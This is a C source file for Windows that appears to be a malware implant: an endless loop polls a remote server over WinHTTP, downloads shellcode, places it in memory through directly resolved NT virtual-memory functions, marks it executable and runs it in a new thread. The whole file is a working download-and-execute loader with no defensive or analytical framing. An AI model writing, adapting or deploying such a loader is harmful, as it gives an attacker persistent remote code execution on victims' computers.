#include "kb.h"

int KbMain()
{
  const int SLEEP_MS = 2000;
  HINTERNET hSession = NULL;

  // global NTPointer references
  if (!NTPointers()) return 1;

  // initialize session
  hSession = WinHttpOpen(NULL, 
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
    WINHTTP_NO_PROXY_NAME, 
    WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) {
    WinHttpCloseHandle(hSession);
    return 1;
  }
  
  for(;;) {
    // restart loop
    LPVOID pDownloadedBytes = NULL;
    LPVOID pShellcode = NULL;

    // re-initialize hrequest
    HINTERNET hRequest = PollServer(hSession);
    if (!hRequest) goto cleanup;

    // get content length
    DWORD dwContentLength = 0;
    DWORD dwSize = sizeof(dwContentLength);
    if (!WinHttpQueryHeaders(hRequest, 
      WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, 
      WINHTTP_HEADER_NAME_BY_INDEX, &dwContentLength, &dwSize, 
      WINHTTP_NO_HEADER_INDEX) || dwContentLength == 0)
    {
      goto cleanup;
    }

    // allocate memory
    pDownloadedBytes = malloc(dwContentLength);
    if (!pDownloadedBytes) {
      goto cleanup;
    }

    // read shellcode
    for (DWORD dwTotalBytesRead = 0; dwTotalBytesRead < dwContentLength;) {
      DWORD dwBytesReadThisCall = 0;
      DWORD dwBytesRemaining = dwContentLength - dwTotalBytesRead;
      
      if (!WinHttpReadData(hRequest, 
        (LPBYTE)pDownloadedBytes + dwTotalBytesRead, dwBytesRemaining, 
        &dwBytesReadThisCall) || dwBytesReadThisCall == 0) 
      {
        free(pDownloadedBytes);
        pDownloadedBytes = NULL;
        goto cleanup;
      }

      dwTotalBytesRead += dwBytesReadThisCall;
    }

    // allocate vmemory
    SIZE_T regionSize = dwContentLength;
    if (pNtAllocateVirtualMemory(GetCurrentProcess(), 
      &pShellcode, 0, &regionSize, 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) 
      != 0 || !pShellcode) 
    {
      goto cleanup;
    }
    
    // copy shellcode to vmemory
    memcpy(pShellcode, pDownloadedBytes, dwContentLength);
    
    // protect vmemory
    ULONG oldProtect = 0;
    pNtProtectVirtualMemory(GetCurrentProcess(), 
    &pShellcode, &regionSize, 
    PAGE_EXECUTE_READ, &oldProtect);

    // create thread and wait
    HANDLE hThread = CreateThread(NULL, 0, 
      (LPTHREAD_START_ROUTINE)pShellcode, NULL, 
      0, NULL);
    if (hThread) {
      WaitForSingleObject(hThread, INFINITE);
      CloseHandle(hThread);
    }

    // iteration cleanup
cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (pDownloadedBytes) free(pDownloadedBytes);
    if (pShellcode) {
      SIZE_T sizeToFree = 0;
      pNtFreeVirtualMemory(GetCurrentProcess(), 
      pShellcode, &sizeToFree, MEM_RELEASE);
    }
    Sleep(SLEEP_MS);
  }
}